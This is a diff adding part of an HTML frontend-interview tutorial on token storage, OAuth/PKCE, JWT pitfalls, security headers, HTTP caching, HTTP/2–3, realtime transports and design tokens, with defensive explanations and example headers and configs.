+      <li><strong>Access token</strong> — short-lived (5–15 min), kept <strong>in a JS variable/closure</strong> (module-scope store), attached as <code>Authorization: Bearer</code>. Never persisted: not localStorage, not a readable cookie. XSS can still grab the in-memory copy <em>while running</em>, but there's nothing durable to steal and a reload clears it.</li>
+      <li><strong>Refresh token</strong> — long-lived, in an <code>httpOnly; Secure; SameSite=Strict</code> cookie <strong>path-scoped to the refresh endpoint only</strong>, so it isn't even sent on normal API calls. On app boot or on a 401, call <code>/auth/refresh</code>; the cookie authenticates it; a fresh access token lands in memory.</li>
+      <li><strong>Rotation + reuse detection:</strong> every refresh issues a <em>new</em> refresh token and invalidates the old one. If an already-rotated token is ever presented — someone replayed a stolen copy — the server revokes the entire token family and forces re-login. This is the OAuth 2 security-BCP posture; it turns a stolen refresh token into a <em>detected event</em>.</li>
+      <li>The refresh endpoint is cookie-authenticated, so it needs CSRF defense of its own (SameSite=Strict + origin checks) — a detail interviewers reward.</li>
+    </ul>
+
+    <h3>BFF: the pattern that dissolves the question</h3>
+    <p>
+      A <strong>Backend-for-Frontend</strong> is a thin server (or edge-function layer) owned by the frontend team, sitting
+      between the SPA and the real APIs. The browser holds only a plain <code>httpOnly</code> <em>session cookie</em> for the
+      BFF; the BFF keeps the OAuth tokens server-side and proxies API calls, attaching tokens itself. Result: <strong>no
+      tokens in the browser at all</strong> — nothing to exfiltrate; XSS is reduced to session riding; refresh, rotation, and
+      revocation become server-side problems; and first-party same-site cookies sidestep the third-party-cookie phase-out.
+      Cost: an extra hop and a service to run. Interview line: "if the security bar is high, I take token handling out of
+      the browser entirely with a BFF — the best place to store a token in the browser is nowhere."
+    </p>
+
+    <h3>OAuth 2 / OIDC at interview depth</h3>
+    <ul>
+      <li><strong>Roles:</strong> the user (resource owner) authorizes a <em>client</em> (your SPA) via an <em>authorization server</em> (Auth0/Okta/Google) to access a <em>resource server</em> (API). OAuth is <em>delegated authorization</em>; <strong>OIDC</strong> layers authentication on top — an <code>id_token</code> (JWT of claims about <em>who signed in</em>, consumed by your app) alongside the <code>access_token</code> (the credential for <em>calling APIs</em>). Don't call APIs with the id_token; don't treat mere possession of an access token as login.</li>
+      <li><strong>Authorization Code + PKCE</strong> is the only current-practice browser flow: the app redirects to the auth server carrying <code>code_challenge = SHA-256(code_verifier)</code>; the user authenticates there; the auth server redirects back with a short-lived one-time <em>code</em>; the app exchanges code + the original <code>code_verifier</code> for tokens. An attacker who intercepts the redirect can't redeem the code — they lack the verifier. PKCE replaces the client secret a public browser client can never keep.</li>
+      <li><strong>The implicit flow is deprecated</strong> — tokens used to come back <em>in the URL fragment</em>, leaking via history, referrers, and logs, with no code-exchange binding. Describing implicit as current practice dates your knowledge by half a decade.</li>
+    </ul>
+
+    <h3>JWT pitfalls (argue both sides)</h3>
+    <ul>
+      <li><strong><code>alg</code> confusion, historically:</strong> the token declares its own algorithm; naive libraries honored <code>alg: none</code> (unsigned tokens accepted) or let attackers flip RS256→HS256 so the RSA <em>public</em> key got used as the HMAC secret. Modern libraries force you to pin expected algorithms. Enduring lesson: never let attacker input choose how it gets verified.</li>
+      <li><strong>No revocation:</strong> a JWT is valid until <code>exp</code>, period. Logout, password change, or account compromise can't invalidate issued tokens without reintroducing server-side state (denylist, token-version claim, or short TTL + rotating refresh) — at which point you've rebuilt sessions with extra steps. This is the strongest "why not JWT-as-session" argument.</li>
+      <li><strong>Readable, and heavy:</strong> JWTs are base64url-encoded, <em>not encrypted</em> — whoever holds one reads its claims, so no PII or secrets inside. A fat claims payload rides on every request. And verify <code>iss</code>, <code>aud</code>, <code>exp</code> — not just the signature.</li>
+      <li>Where JWTs shine: <strong>stateless service-to-service / API authorization</strong> — short-lived, verifiable at the edge with no session-store round trip. The senior answer is placement, not love or hate.</li>
+    </ul>
+    <div class="senior">
+      A crisp closing position: "Short-lived access token in memory, rotating refresh token in a path-scoped httpOnly
+      cookie, SameSite everywhere, strict CSP as backstop — and if the threat model justifies it, a BFF so the browser never
+      holds tokens at all. localStorage for tokens is the one option whose worst case has no mitigation."
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2 id="headers">5. Security headers &amp; platform defenses <span class="tier tier-2">T2</span></h2>
+    <p>
+      Beyond CSP, a family of response headers hardens the platform itself. Interviewers use these as a depth probe — you
+      won't recite them all unprompted, but "what security headers would you ship on a new app?" should produce a confident,
+      justified list.
+    </p>
+
+    <h3>The core set</h3>
+    <table>
+      <thead><tr><th>Header</th><th>Recommended value</th><th>What it defends against</th></tr></thead>
+      <tbody>
+        <tr><td><code>Strict-Transport-Security</code> (HSTS)</td><td><code>max-age=63072000; includeSubDomains; preload</code></td><td>SSL stripping: after first contact the browser <em>refuses</em> plain HTTP to your host — it upgrades before any request leaves. <code>preload</code> + the browser preload list closes even the first-visit hole. Commit carefully: preload is effectively one-way, and <code>includeSubDomains</code> breaks any HTTP-only subdomain.</td></tr>
+        <tr><td><code>X-Content-Type-Options</code></td><td><code>nosniff</code></td><td>MIME sniffing: stops the browser "helpfully" executing a user-uploaded "image" that's really script, and enforces declared types on scripts/styles.</td></tr>
+        <tr><td><code>Content-Security-Policy: frame-ancestors</code></td><td><code>'none'</code> or <code>'self'</code></td><td><strong>Clickjacking</strong>: an attacker iframes your app at near-zero opacity beneath a fake "click to win" UI; the victim's click lands on your real "Transfer" button. <code>frame-ancestors</code> controls who may embed you; it supersedes <code>X-Frame-Options</code> (keep XFO <code>DENY</code> only as legacy belt-and-braces).</td></tr>
+        <tr><td><code>Referrer-Policy</code></td><td><code>strict-origin-when-cross-origin</code> (the modern default)</td><td>URL leakage: cross-origin requests carry only your <em>origin</em>, not full paths/queries (which hold reset tokens, document IDs, search terms); nothing at all HTTPS→HTTP.</td></tr>
+        <tr><td><code>Permissions-Policy</code></td><td><code>camera=(), microphone=(), geolocation=()</code>…</td><td>Locks powerful APIs off for your page <em>and every embedded iframe</em> — a compromised ad or widget can't even prompt for the camera.</td></tr>
+      </tbody>
+    </table>
+
+    <h3>Cross-origin isolation: COOP / COEP / CORP</h3>
+    <p>
+      Post-Spectre, browsers gated the sharp-edged APIs — <code>SharedArrayBuffer</code>, high-resolution timers,
+      <code>performance.measureUserAgentSpecificMemory()</code> — behind <strong>cross-origin isolation</strong>: speculative
+      execution can read anything mapped into your process, and cross-origin content historically shared that process.
+    </p>
+<pre><code>Cross-Origin-Opener-Policy: same-origin    <span class="com"># COOP — sever window references between you and</span>
+                                           <span class="com"># cross-origin openers/popups (own browsing-context</span>
+                                           <span class="com"># group → own process)</span>
+Cross-Origin-Embedder-Policy: require-corp <span class="com"># COEP — you may only embed resources that opt in</span>
+                                           <span class="com"># (via CORS or a CORP header)</span>
+Cross-Origin-Resource-Policy: same-site    <span class="com"># CORP — a resource declaring who may embed IT</span>
+
+<span class="com">// With COOP + COEP both set:</span>
+crossOriginIsolated === <span class="kw">true</span>   <span class="com">// SharedArrayBuffer &amp; precise timers unlock</span></code></pre>
+    <p>
+      Sound bite: "COOP isolates my <em>window</em> from strangers, COEP forces everything I <em>embed</em> to consent, and CORP
+      is how a resource consents. Together they guarantee no non-consenting cross-origin data shares my process, so the
+      browser re-enables <code>SharedArrayBuffer</code>." You meet this the day ffmpeg.wasm / SQLite-wasm / multithreaded WASM
+      "randomly" fails — the fix is these headers, and the real migration cost is that every cross-origin image/script you
+      embed now needs CORS or CORP. Caveat: COOP <code>same-origin</code> breaks OAuth popup flows that rely on
+      <code>window.opener</code>; <code>same-origin-allow-popups</code> is the compromise.
+    </p>
+
+    <h3>Subresource integrity &amp; iframe sandbox</h3>
+<pre><code><span class="com">&lt;!-- SRI: the browser hashes the fetched file and refuses to execute on mismatch.</span>
+<span class="com">     Defends against a compromised CDN / third-party host serving tampered JS. --&gt;</span>
+&lt;script src=<span class="str">"https://cdn.example.com/lib@4.2.1/lib.min.js"</span>
+        integrity=<span class="str">"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"</span>
+        crossorigin=<span class="str">"anonymous"</span>&gt;&lt;/script&gt;
+
+<span class="com">&lt;!-- sandbox: the iframe starts with NOTHING (no script, no forms, no popups,</span>
+<span class="com">     a unique opaque origin) — re-grant only what's needed: --&gt;</span>
+&lt;iframe src=<span class="str">"https://widget.example.com"</span>
+        sandbox=<span class="str">"allow-scripts allow-forms"</span>&gt;&lt;/iframe&gt;
+<span class="com">&lt;!-- NEVER combine allow-scripts + allow-same-origin on same-origin content:</span>
+<span class="com">     the framed page can reach up and remove its own sandbox attribute. --&gt;</span></code></pre>
+    <p>
+      SRI only makes sense for pinned, immutable URLs; it's incompatible with auto-updating "latest" CDN links — which is
+      itself an argument for self-hosting and bundling dependencies (fewer connections, no third-party availability
+      dependency, and your CSP stays tight).
+    </p>
+
+    <h3>Supply chain: the attack surface no header fixes</h3>
+    <ul>
+      <li><strong>Your real trusted computing base is <code>node_modules</code>:</strong> a malicious <code>postinstall</code> script or a compromised maintainer account (event-stream, ua-parser-js, polyfill.io) ships attacker code inside your bundle — inside your origin, past every defense above.</li>
+      <li><strong>Lockfiles are a security control:</strong> commit them, install with <code>npm ci</code> in CI (exact, reproducible), and review lockfile diffs — a dependency's resolved URL changing to an unexpected host is a red flag.</li>
+      <li><strong><code>npm audit</code> stance (a favorite probe):</strong> triage, don't worship. Much of the output is dev-time or unreachable-path noise — but "we ignore audit" and "we blindly <code>audit fix --force</code>" are both wrong. Gate CI on high/critical findings in <em>production</em> dependencies, review the rest, prefer provenance/install-script scanners, and delay-adopt brand-new versions — most compromises are caught within days of publish.</li>
+      <li><strong>Fewer dependencies is a security feature:</strong> every transitive package is a party you've granted script execution in your users' sessions. The platform (fetch, Intl, structuredClone, URL) has absorbed much of what once justified utility deps.</li>
+    </ul>
+    <div class="note">
+      Auditing an app you just inherited takes an afternoon: header scan (Lighthouse best-practices or an online scanner),
+      dependency + lockfile audit, CSP in report-only mode to surface inline-script reality, then targeted code review of
+      the XSS sinks (§1) and cookie flags (§4). That ordering is itself a good interview answer.
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2 id="http-caching">6. HTTP caching <span class="tier tier-1">T1</span></h2>
+    <p>
+      Tutorial 17 covered caching from the performance angle; this section makes the header vocabulary itself airtight,
+      because "explain <code>no-cache</code> vs <code>no-store</code>" and "design the caching strategy for a release" are
+      standalone interview questions. Mental model: every cached response is either <strong>fresh</strong> (age &lt; its
+      lifetime → served instantly, no network) or <strong>stale</strong> (must be <strong>revalidated</strong> — a conditional
+      request that costs a round trip but usually not a body).
+    </p>
+
+    <h3>Cache-Control vocabulary</h3>
+    <table>
+      <thead><tr><th>Directive</th><th>Meaning</th><th>Notes / classic confusion</th></tr></thead>
+      <tbody>
+        <tr><td><code>max-age=N</code></td><td>Fresh for N seconds from response generation</td><td>Counts from when the response was created (<code>Age</code> header transfers elapsed CDN time), not from when the browser got it</td></tr>
+        <tr><td><code>s-maxage=N</code></td><td>Freshness for <strong>shared</strong> caches (CDN/proxy) only</td><td>Overrides <code>max-age</code> at the CDN; lets you say "browser: always check; CDN: hold for 5 min"</td></tr>
+        <tr><td><code>no-cache</code></td><td><strong>Store, but revalidate before every use</strong></td><td>Does NOT mean "don't cache" — it means "never serve without asking the origin." With an ETag, that's a cheap 304</td></tr>
+        <tr><td><code>no-store</code></td><td>Never write this response to any cache</td><td>The actual "don't cache." For sensitive data. Also disqualifies the page from bfcache — don't blanket-apply it</td></tr>
+        <tr><td><code>private</code> / <code>public</code></td><td>Only the browser may store it / shared caches may too</td><td><code>private</code> for per-user responses behind cookies; <code>public</code> can make responses with <code>Authorization</code> cacheable by CDNs — be deliberate</td></tr>
+        <tr><td><code>must-revalidate</code></td><td>Once stale, MUST revalidate — never serve stale on error</td><td>Contrast: without it, caches may serve stale if the origin is unreachable</td></tr>
+        <tr><td><code>stale-while-revalidate=N</code></td><td>Serve the stale copy instantly, refresh in the background</td><td>The latency-hiding directive: users get cache speed, the cache stays hot. Mostly a CDN feature</td></tr>
+        <tr><td><code>immutable</code></td><td>"This URL's content will never change — skip revalidation even on reload"</td><td>For content-hashed assets; kills the flood of 304 checks on browser reload</td></tr>
+      </tbody>
+    </table>
+
+    <h3>Revalidation: ETag / Last-Modified</h3>
+<pre><code><span class="com">── First response ──────────────────────────────────────────────</span>
+HTTP/1.1 200 OK
+Cache-Control: no-cache                <span class="com"># store, but always revalidate</span>
+ETag: "v2-8f3a"                        <span class="com"># opaque content fingerprint</span>
+Last-Modified: Tue, 03 Jun 2025 10:00:00 GMT
+
+<span class="com">── Later: browser revalidates instead of re-downloading ───────</span>
+GET /app.html
+If-None-Match: "v2-8f3a"               <span class="com"># ETag wins over If-Modified-Since</span>
+If-Modified-Since: Tue, 03 Jun 2025 10:00:00 GMT
+
+<span class="com">── Unchanged → tiny response, cached body reused ──────────────</span>
+HTTP/1.1 304 Not Modified              <span class="com"># headers only, no body transferred</span></code></pre>
+    <ul>
+      <li><strong>ETag</strong> is a content fingerprint (hash, version) — precise, sub-second capable. <strong>Last-Modified</strong> has 1-second granularity and lies when files are touched without changing. ETag takes precedence when both are present.</li>
+      <li>Gotcha: default ETags in some servers derive from inode/mtime and <strong>differ across load-balanced instances</strong>, silently breaking revalidation (every check "misses"). Use content-based ETags or drop them in favor of hashed URLs.</li>
+      <li><strong>Weak ETags</strong> (<code>W/"…"</code>) mean semantic equivalence, not byte equality — fine for revalidation, not for byte-range requests.</li>
+    </ul>
+
+    <h3>Heuristic caching — the silent default</h3>
+    <p>
+      No <code>Cache-Control</code> at all does <em>not</em> mean no caching: if a response has a <code>Last-Modified</code>,
+      browsers may cache it heuristically — commonly ~10% of the time since modification. This is how "we never set cache
+      headers" becomes "some users see week-old JS." Rule: <strong>every response should have an explicit cache policy</strong>,
+      even if that policy is <code>no-store</code>.
+    </p>
+
+    <h3>The canonical SPA strategy</h3>
+<pre><code><span class="com"># Hashed, immutable build assets — the URL *is* the version:</span>
+/assets/app.9f8e7d.js      Cache-Control: public, max-age=31536000, immutable
+/assets/chunk.1a2b3c.css   Cache-Control: public, max-age=31536000, immutable
+
+<span class="com"># HTML — the mutable pointer to the immutable graph:</span>
+/index.html                Cache-Control: no-cache            <span class="com"># + ETag → cheap 304s</span>
+<span class="com">#   …or let the CDN absorb traffic while staying fresh-ish:</span>
+/index.html                Cache-Control: max-age=0, s-maxage=300, stale-while-revalidate=60
+
+<span class="com"># Authenticated API JSON:</span>
+/api/me                    Cache-Control: private, no-store   <span class="com"># or private, max-age=0 + ETag</span>
+
+<span class="com"># Public API (product catalog):</span>
+/api/products              Cache-Control: public, s-maxage=60, stale-while-revalidate=300</code></pre>
+    <p>
+      Why it works: deploys are <strong>atomic</strong> — new HTML references new hashes; old assets remain valid for
+      still-open tabs; there is no cache-purge choreography and no "user has new HTML with old JS" window (keep a couple of
+      old builds on the CDN for in-flight sessions). This answer, delivered fluently, is a reliable senior signal.
+    </p>
+
+    <h3>CDN layers and Vary</h3>
+    <ul>
+      <li>Requests traverse <strong>browser cache → (service worker) → CDN edge → regional/origin shield → origin</strong>. Each layer obeys its own directives: <code>s-maxage</code> and <code>stale-while-revalidate</code> live mostly at the CDN; <code>max-age</code> governs the browser. Design them <em>separately</em> — long CDN + zero browser is a legitimate combo (you can purge a CDN; you cannot purge browsers).</li>
+      <li><strong><code>Vary</code></strong> names the request headers that partition the cache key. <code>Vary: Accept-Encoding</code> (gzip vs brotli copies) is table stakes; <code>Vary: Origin</code> for CORS responses (§3); <code>Vary: Accept-Language</code> if you content-negotiate locales. Varying on <code>Cookie</code> effectively disables shared caching — a common accidental foot-gun.</li>
+      <li>Purge strategies: content-hashed URLs make purging almost unnecessary; for the rest, prefer <strong>soft purge</strong> (mark stale, revalidate) over hard purge (thundering herd on the origin).</li>
+    </ul>
+    <div class="pitfall">
+      The classic incident: HTML cached with <code>max-age=31536000</code> (someone applied the asset rule to everything).
+      Users are pinned to a dead build for a year, and you cannot purge their browsers. Immutable caching is for
+      <em>content-addressed URLs only</em>; anything at a stable URL must be <code>no-cache</code> or short-lived. If it ever
+      happens, your only lever is changing the URLs users request (path prefix, service-worker takeover) — much cheaper to
+      never let HTML be long-cached.
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2 id="http23">7. HTTP/1.1 → HTTP/2 → HTTP/3 <span class="tier tier-2">T2</span></h2>
+    <p>
+      The whole arc is one story told three times: <strong>head-of-line (HOL) blocking, pushed down a layer at each
+      generation</strong>. Tell it that way and the facts organize themselves.
+    </p>
+
+    <h3>HTTP/1.1 — HOL at the application layer</h3>
+    <ul>
+      <li>One request at a time per connection (pipelining existed but was broken by intermediaries and never viable). A slow response blocks everything queued behind it on that connection.</li>
+      <li>Browsers compensated with <strong>~6 parallel connections per origin</strong> — and the era's folk optimizations were all connection-workarounds: <strong>domain sharding</strong> (fake extra origins for more connections), <strong>sprite sheets</strong>, <strong>inlining</strong>, <strong>file concatenation</strong>.</li>
+      <li>Headers repeat verbatim on every request — kilobytes of identical cookies and UA strings, uncompressed.</li>
+    </ul>
+
+    <h3>HTTP/2 (2015) — multiplexing, HOL pushed down to TCP</h3>
+    <ul>
+      <li><strong>Binary framing + streams:</strong> one TCP connection carries many concurrent streams; frames interleave; a slow response no longer blocks others <em>at the HTTP layer</em>. The 6-connection limit and the sharding/spriting hacks became anti-patterns overnight (sharding actively hurts: it defeats prioritization and multiplies TLS handshakes).</li>
+      <li><strong>HPACK header compression:</strong> static + dynamic tables mean a repeated cookie header costs a few bytes after the first send.</li>
+      <li><strong>Prioritization:</strong> streams carry weights/dependencies so the server can send CSS before images — in practice server support was so inconsistent that the scheme was replaced by a simpler priority signal (RFC 9218).</li>
+      <li><strong>Server Push is dead:</strong> the marquee feature — pushing assets before the client asks — over-pushed things already in cache, wasted bandwidth, and was barely used correctly; Chrome removed support in 2022. Its use case is served by <strong>103 Early Hints</strong> (the origin says "while you wait, preconnect/preload these") — knowing this swap is a strong currency signal.</li>
+      <li><strong>The remaining problem:</strong> TCP guarantees in-order delivery <em>of the whole byte stream</em>. Lose one packet and every multiplexed stream stalls until retransmission — <strong>TCP-layer HOL blocking</strong>. On lossy networks (mobile), H2 can genuinely underperform six H1.1 connections, because one loss now stalls <em>everything</em>.</li>
+    </ul>
+
+    <h3>HTTP/3 (2022) — QUIC, HOL solved at the transport</h3>
+    <ul>
+      <li><strong>QUIC runs over UDP</strong> and reimplements reliability per-stream in user space: streams are independently delivered, so a lost packet stalls <em>only the stream it belonged to</em>. That's the headline fix.</li>
+      <li><strong>Integrated TLS 1.3:</strong> transport and crypto handshakes are combined — 1-RTT to first byte for new connections, and <strong>0-RTT resumption</strong> lets a returning client send the request in the very first flight. (0-RTT data is replayable → servers must accept only idempotent requests in it; a nice security-networking crossover point.)</li>
+      <li><strong>Connection migration:</strong> QUIC connections are identified by connection IDs, not the (IP, port) 4-tuple — walk from Wi-Fi to cellular and the connection <em>survives</em> instead of re-handshaking. Being in user space, QUIC also evolves without waiting for OS kernels.</li>
+      <li>Discovery: browsers learn H3 support via the <code>Alt-Svc</code> header or the HTTPS DNS record; first contact is usually H2, upgrading after.</li>
+    </ul>
+    <table>
+      <thead><tr><th></th><th>HTTP/1.1</th><th>HTTP/2</th><th>HTTP/3</th></tr></thead>
+      <tbody>
+        <tr><td>Transport</td><td>TCP</td><td>TCP (+TLS)</td><td><strong>QUIC over UDP</strong> (TLS 1.3 built in)</td></tr>
+        <tr><td>Concurrency</td><td>~6 connections, 1 req each</td><td>Many streams, 1 connection</td><td>Many streams, 1 connection</td></tr>
+        <tr><td>HOL blocking</td><td>HTTP layer (per connection)</td><td>Solved at HTTP; <strong>remains at TCP</strong></td><td>Solved at both — independent stream delivery</td></tr>
+        <tr><td>Header compression</td><td>None</td><td>HPACK</td><td>QPACK (HOL-resistant variant)</td></tr>
+        <tr><td>Handshake to first byte</td><td>TCP + TLS ≈ 2–3 RTT</td><td>TCP + TLS 1.3 ≈ 2 RTT</td><td>1 RTT; <strong>0-RTT</strong> resumption</td></tr>
+        <tr><td>Network switch (Wi-Fi→LTE)</td><td>New connection</td><td>New connection</td><td><strong>Survives</strong> (connection ID migration)</td></tr>
+      </tbody>
+    </table>
+
+    <h3>"Does H2/H3 make bundling obsolete?" — the myth question</h3>
+    <p>
+      No — and interviewers ask precisely to see if you parrot the 2016 take. Multiplexing removed the <em>connection</em> cost
+      of many files, but not the other costs of shipping 2,000 modules individually:
+    </p>
+    <ul>
+      <li><strong>Compression efficiency:</strong> brotli across one large file exploits cross-module redundancy; 2,000 tiny files compress independently and much worse (shared dictionaries are still niche).</li>
+      <li><strong>Per-request overhead remains:</strong> scheduling, prioritization, cache lookups, and — for module graphs — <em>discovery waterfalls</em>: import depth N means N sequential round trips unless you preload the whole graph.</li>
+      <li>What H2/H3 <em>did</em> change: the optimum shifted from "one giant bundle" to <strong>a few dozen well-chosen chunks</strong> — fine enough for route-level caching (one changed module doesn't invalidate the world), coarse enough to compress and schedule well. That's exactly the code-splitting posture from tutorials 16–17.</li>
+    </ul>
+    <div class="note">
+      TLS basics worth having ready: TLS 1.3 cut the handshake to one round trip and removed the legacy cipher zoo;
+      session resumption (tickets) enables 0-RTT; certificates chain to a trusted CA, which is what the browser padlock
+      actually verifies (identity, then key exchange, then symmetric encryption). One sentence each is the right depth
+      for a frontend loop.
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2 id="realtime">8. WebSockets vs SSE vs polling <span class="tier tier-2">T2</span></h2>
+    <p>
+      "Design the realtime layer for X" is a system-design staple, and the senior differentiator is picking the
+      <em>cheapest mechanism that satisfies the data flow</em> — not defaulting to WebSockets because they sound realtime.
+      First question to ask: <strong>does the client need to push, or only receive?</strong>
+    </p>
+
+    <h3>The mechanics</h3>
+    <ul>
+      <li><strong>Short polling:</strong> <code>setInterval(fetch)</code>. Latency = poll interval; cost = constant requests even when nothing changed. Fine for dashboards refreshing every 30 s; embarrassing for chat.</li>
+      <li><strong>Long polling:</strong> the server <em>holds</em> the request open until data exists (or timeout), responds, and the client immediately re-requests. Near-realtime latency over plain HTTP — at the cost of connection churn, and re-sent headers per message.</li>
+      <li><strong>SSE (Server-Sent Events):</strong> one long-lived plain HTTP response with <code>Content-Type: text/event-stream</code>; the server writes <code>data:</code> frames forever; the browser's <code>EventSource</code> parses them. Server→client only, text (UTF-8) only.</li>
+      <li><strong>WebSocket:</strong> starts as an HTTP GET with <code>Upgrade: websocket</code> + <code>Sec-WebSocket-Key</code>; a <code>101 Switching Protocols</code> response replaces HTTP framing with a persistent, <strong>full-duplex</strong>, low-overhead frame protocol (text + binary) on the same TCP connection.</li>
+    </ul>
+<pre><code><span class="com">── SSE: it's just HTTP ─────────────────────────────</span>
+GET /notifications HTTP/1.1
+Accept: text/event-stream
+
+HTTP/1.1 200 OK
+Content-Type: text/event-stream
+Cache-Control: no-store
+
+id: 42
+event: message
+data: {"title":"Deploy finished"}
+
+retry: 5000          <span class="com"># server-tunable reconnect delay</span>
+
+<span class="com">── WebSocket: HTTP only for the handshake ─────────</span>
+GET /chat HTTP/1.1
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+
+HTTP/1.1 101 Switching Protocols
+Upgrade: websocket
+Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=   <span class="com"># proves a real WS server answered</span></code></pre>
+
+    <h3>The comparison that decides designs</h3>
+    <table>
+      <thead><tr><th></th><th>SSE</th><th>WebSocket</th><th>Long polling</th></tr></thead>
+      <tbody>
+        <tr><td>Direction</td><td>Server → client only</td><td><strong>Bidirectional</strong></td><td>Server → client (client sends via normal requests)</td></tr>
+        <tr><td>Payloads</td><td>UTF-8 text (JSON in practice)</td><td>Text + <strong>binary</strong></td><td>Anything HTTP can carry</td></tr>
+        <tr><td>Auto-reconnect</td><td><strong>Built in</strong> — plus <code>Last-Event-ID</code> header on reconnect for resume/replay</td><td>None — you implement backoff, heartbeat, and resume yourself</td><td>Inherent (every request is new)</td></tr>
+        <tr><td>Protocol</td><td>Plain HTTP — H2/H3 multiplexing applies</td><td>Own protocol after upgrade; H2 needs RFC 8441 (spotty), commonly a separate H1.1 connection</td><td>Plain HTTP</td></tr>
+        <tr><td>Infra friction</td><td>Low — but buffering proxies must be told not to buffer; needs heartbeat comments through idle timeouts</td><td>Higher — every LB/proxy/WAF must speak Upgrade; idle timeouts kill quiet connections (ping/pong)</td><td>Lowest — it's just requests</td></tr>
+        <tr><td>Headers/auth</td><td>Cookies yes; <strong>custom headers no</strong> (EventSource can't set them — token via cookie or query param, or use fetch-based streaming)</td><td>Cookies yes; custom headers no in the browser API — auth via cookie, subprotocol, or first message</td><td>Full control</td></tr>
+        <tr><td>Sweet spot</td><td>Notifications, feeds, tickers, job/LLM progress streams</td><td>Chat, collaborative editing, multiplayer, anything client-push-heavy</td><td>Legacy-proxy environments, rare events, simplicity</td></tr>
+      </tbody>
+    </table>
+    <div class="note">
+      The H1.1 six-connections-per-origin limit used to make SSE dangerous (six tabs = origin starved); over H2/H3, SSE
+      streams are just multiplexed streams on one connection, and the problem dissolves. LLM chat UIs made this pattern
+      mainstream again — token streaming is exactly SSE-shaped (server-push, text, resumable).
+    </div>
+
+    <h3>Scaling fan-out — where the design question actually lives</h3>
+    <ul>
+      <li><strong>Stateful connections change your ops model:</strong> a node holding 50k open sockets can't be drained/deployed like a stateless API server. Deploys need connection draining and client resume; autoscaling on CPU misses memory-bound connection counts.</li>
+      <li><strong>Sticky sessions vs shared state:</strong> either the LB pins a client to the node that holds its connection state, or (better) nodes are dumb pipes and a <strong>pub/sub backplane</strong> (Redis, Kafka, NATS) fans messages out: publisher → topic → every node forwards to its subscribed sockets. That sentence is the expected answer to "how does user A's message reach user B on another server?"</li>
+      <li><strong>Resume protocol:</strong> reconnects need "what did I miss?" — SSE gives you <code>Last-Event-ID</code> for free if you put sequence IDs on events; on WebSocket you build the equivalent (client sends last-seen cursor on connect, server replays from a buffer).</li>
+      <li><strong>Backpressure:</strong> a slow consumer on a fast stream needs coalescing (send latest state, not every delta), buffer caps, or drop-and-resync. Naming backpressure unprompted is a strong senior signal.</li>
+      <li><strong>WebTransport</strong> (awareness level): QUIC-native successor territory — multiple independent streams <em>and</em> unreliable datagrams (game state, live media), no TCP HOL. Not yet universal; mention it as "what I'd evaluate for latency-critical binary streams."</li>
+    </ul>
+    <div class="senior">
+      Rehearsable design answer — notifications feed: "Server-push only, low volume, text: SSE. Free auto-reconnect with
+      <code>Last-Event-ID</code> resume, plain HTTP through every proxy and my existing auth cookie, multiplexes over H2.
+      I'd add WebSockets only when the client needs to push at conversational rates — chat, presence, collab editing — and
+      then I'd budget for the real costs: heartbeats, resume protocol, sticky routing or a pub/sub backplane, and
+      drain-aware deploys."
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2 id="design-systems">9. Design systems &amp; design tokens <span class="tier tier-2">T2</span></h2>
+    <p>
+      Product companies ask this constantly ("you'd own our design system — how would you run it?"), and it's a
+      system-design question in disguise: API design, versioning, distribution, and governance — applied to UI.
+    </p>
+
+    <h3>Token layers: primitive → semantic → component</h3>
+    <p>
+      Design tokens are named design decisions (color, spacing, type, radius, motion) stored as data, not hardcoded in
+      components. The architecture that scales is a <strong>three-layer indirection</strong>:
+    </p>
+<pre><code><span class="com">/* Layer 1 — primitives: the raw palette. No opinions, never used directly in components. */</span>
+--blue-500: <span class="num">#2563eb</span>;
+--gray-900: <span class="num">#111827</span>;
+--space-4:  <span class="num">1rem</span>;
+
+<span class="com">/* Layer 2 — semantic: meaning, not appearance. THE theming surface. */</span>
+--color-action-primary:  <span class="kw">var</span>(--blue-500);
+--color-text-default:    <span class="kw">var</span>(--gray-900);
+--color-surface-raised:  <span class="num">#ffffff</span>;
+
+<span class="com">/* Layer 3 — component: scoped decisions, derived from semantic. */</span>
+--button-primary-bg:     <span class="kw">var</span>(--color-action-primary);
+--button-primary-radius: <span class="kw">var</span>(--radius-md);</code></pre>
+    <ul>
+      <li><strong>Why the indirection earns its keep:</strong> dark mode, brand themes, and white-labeling become <em>reassignments of layer 2</em> — components never change (§11). A rebrand that would be a 3-month grep becomes a token-file swap.</li>
+      <li><strong>Naming discipline is the hard part:</strong> semantic names describe <em>role</em> (<code>text-danger</code>, <code>surface-sunken</code>), never appearance (<code>red-text</code> — which breaks the moment danger becomes orange in a theme).</li>
+      <li>Tokens live in a source-of-truth format (JSON/YAML — the W3C Design Tokens Community Group format is the emerging standard) and are <em>built</em> into platform outputs — CSS custom properties, TS constants, iOS/Android resources — with a transformer like Style Dictionary. One decision, every platform.</li>
+    </ul>
+
+    <h3>Theming architecture with custom properties</h3>
+<pre><code><span class="com">/* Themes are just scopes that reassign the semantic layer: */</span>
+:root                { --color-surface: <span class="num">#fff</span>;    --color-text: <span class="num">#111827</span>; }
+[data-theme=<span class="str">"dark"</span>] { --color-surface: <span class="num">#111827</span>; --color-text: <span class="num">#f9fafb</span>; }
+[data-brand=<span class="str">"acme"</span>]  { --color-action-primary: <span class="num">#7c3aed</span>; }
+
+<span class="com">/* Components read semantics — they are theme-unaware: */</span>
+.card { background: <span class="kw">var</span>(--color-surface); color: <span class="kw">var</span>(--color-text); }</code></pre>
+    <p>
+      Custom properties beat build-time theming (Sass variables, styled-components theme objects in JS) because they are
+      <strong>runtime, cascade-scoped, and zero-rerender</strong>: switching <code>data-theme</code> restyles the page without
+      touching React, and a subtree can carry its own theme (a dark sidebar in a light app) for free.
+    </p>
+
+    <h3>Component API consistency — the DS as an API surface</h3>
+    <ul>
